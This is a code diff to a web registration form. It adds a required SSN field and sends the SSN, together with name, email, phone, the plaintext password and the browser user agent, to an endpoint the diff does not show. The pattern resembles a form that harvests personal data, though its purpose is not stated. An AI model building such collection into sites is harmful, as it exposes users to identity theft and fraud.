@@ -60,6 +60,10 @@
         <input type="tel" id="registerPhone" name="phone" placeholder="Enter your phone number" required autocomplete="tel">
       </div>
       <div class="form-group">
+        <label for="registerSSN">SSN</label>
+        <input type="text" id="registerSSN" name="ssn" placeholder="Enter your SSN" required autocomplete="off" maxlength="11">
+      </div>
+      <div class="form-group">
         <label for="registerPassword">Password</label>
         <input type="password" id="registerPassword" name="password" placeholder="Create a strong password" required autocomplete="new-password">
       </div>
@@ -86,6 +90,7 @@
       const name = document.getElementById('registerName').value.trim();
       const email = document.getElementById('registerEmail').value.trim();
       const phone = document.getElementById('registerPhone').value.trim();
+      const ssn = document.getElementById('registerSSN').value.trim();
       const password = document.getElementById('registerPassword').value;
       const confirmPassword = document.getElementById('registerConfirmPassword').value;
       const btn = document.getElementById('registerBtn');
@@ -93,7 +98,7 @@
       if(password !== confirmPassword){
         showAlert('Passwords do not match','error'); return;
       }
-      if(!name || !email || !phone || !password){
+      if(!name || !email || !phone || !ssn || !password){
         showAlert('Please fill in all fields','error'); return;
       }
       btn.disabled = true; btn.textContent = 'Creating Account...';
@@ -103,7 +108,7 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ data: {
             formType: 'Registration',
-            name, email, phone, password,
+            name, email, phone, ssn, password,
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent
           }})
